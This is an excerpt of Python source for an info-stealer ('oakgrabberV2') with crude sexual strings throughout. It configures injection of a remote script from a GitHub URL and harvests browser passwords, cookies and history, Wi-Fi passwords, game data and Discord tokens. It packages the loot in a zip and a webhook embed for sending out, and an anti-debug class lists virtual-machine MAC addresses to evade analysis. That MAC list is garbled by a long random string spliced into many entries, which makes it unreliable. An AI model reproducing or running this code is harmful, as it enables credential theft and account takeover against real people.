...
config = {
    ...
    'inject': True,
    'injection_url': 'https://raw.githubusercontent.com/ohioguy123/boob/main/oakv2.py',
    'Black_Screen': True,
...
class oakgrabberV2(functions):
    ...
    def browserinfo(self, platform, path):
        p_header = f"BOOBS DICK Passwords\nBrowser:{platform}\n\n"
        c_header = f"BOOBS DICK Cookies\nBrowser:{platform}\n\n\n"
        h_header = f"BOOBS DICK History\nBrowser:{platform}\n\n"
        m_header = f"BOOBS DICK Other Info\nBrowser:{platform}\n\n"
        b_header = f"BOOBS DICK Bookmarks\nBrowser:{platform}\n\n"
        e_header = f"BOOBS DICK Extensions\nBrowser:{platform}\n\n"
        d_header = f"BOOBS DICK Download History\nBrowser:{platform}\n\n"
    ...
    def grabwifi(self):
        ...
        for i in profiles:
            ...
            with open(self.dir+"\\Wifi passwords.txt","w") as f:
                f.write(f"BOOBS DICK wifi passwords\n\nWi-Fi Name                    | Password\n------------------------------------------\n")
                ...
                for line in f.readlines():
                    if line.startswith("Data="):
                        with open(os.path.join(self.dir, "Epic games data.txt"), 'w', encoding="cp437") as g:
                            g.write(
                                f"BOOBS DICK Epic Games Offline Data\n\n")
            ...
            for token in self.tokens:
                ...
                if res.status_code == 200:
                    ...
                    if not user_name in username:
                        ...
                        embed = {
                            "username": f"Dc Info | BOOBS DICK",
                            "avatar_url": "",
                            "embeds": [
                                {
                                    "author": {
                                        "name": "pornhub is good for you",
                                        "url": "",
                                        "icon_url": ""
                                    },
    ...
    def sysinfo(self):
        ...
        try:
            ...
            self.exceptions.append(traceback.format_exc())
        embed = {
            "username": f"System Info | BOOBS DICK",
            "avatar_url": "",
            "title": "__BOOBS DICK System Info__",
            "embeds": [
                     {
                         "author": {
                             "name": "pornhub is good for you | BOOBS DICK",
                             "url": "",
                             "icon_url": ""
                         },
    ...
    def upload(self):
        name = os.getlogin()
        _zipfile = os.path.join(self.dir, f'BOOBS DICK-{os.getlogin()}.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                if filename == f'BOOBS DICK-{os.getlogin()}.zip':
                    continue
        ...
        if config.get('Ping_on_run'):
            ...
            content = ""
        embed = {
            "username": f"{name} | BOOBS DICK",
            "content": content,
            "avatar_url": "",
            "title": "__BOOBS DICK__",
            "embeds": [
                     {
                         "author": {
                             "name": "pornhub is good for you",
...
class AntiDebug(functions):
    ...
    def __init__(self):
        ...
        self.Macs = [
            ...
            '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD:1b:21:13:15:20',
            '00:15:5d:00:06:8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c',
            ...
            '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD:1b:21:13:32:51', 'a6:24:aa:ae:e6:12',
            '08:00:27:45:13:10', '00:1b:21:13:26:8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33',
            '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29',
            ...
            '00:50:56:b3:fa:23', '52:54:00:a0:8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb',
            '8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75',
            ...
            '00:50:56:ae:6f:54', '8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec',
